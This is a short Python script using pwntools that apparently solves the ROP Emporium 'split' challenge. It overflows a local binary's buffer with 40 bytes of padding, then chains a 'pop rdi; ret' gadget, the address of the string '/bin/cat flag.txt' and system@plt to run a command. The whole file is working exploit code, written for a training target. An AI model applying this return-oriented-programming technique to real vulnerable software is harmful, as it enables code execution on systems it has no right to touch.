from pwn import *

p = ELF('./split')
r = process('./split')
rop = ROP('./split')

sys = p.plt['system']
magic = next(p.search(b'/bin/cat flag.txt'))
popret = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info('system 0x%x' %sys)
log.info('magic 0x%x' %magic)

junk = b'X'*40
payload = junk
payload += p64(popret)
payload += p64(magic)
payload += p64(sys)

r.sendline(payload)
r.interactive()